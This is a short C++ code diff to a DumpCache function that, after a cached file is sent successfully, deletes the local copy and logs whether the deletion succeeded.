@@ -86,9 +86,14 @@ void DumpCache()
 			}
 			else if (res == SUCCESS)
 			{
-				// TODO delete file
 				std::cout << "Sent [" << path << "] Successfully" << std::endl;
-				IO::WriteAppLog("Successfully sent file [" + path + "]");
+				IO::WriteAppLog("Successfully sent file [" + path + "]");	
+
+				if (std::filesystem::remove(path))
+					IO::WriteAppLog("Deleted File " + path);
+				else
+					IO::WriteAppLog("Failed to delete file " + path);
+				std::cout << "deleted file" << std::endl;
 			}
 			else
 			{
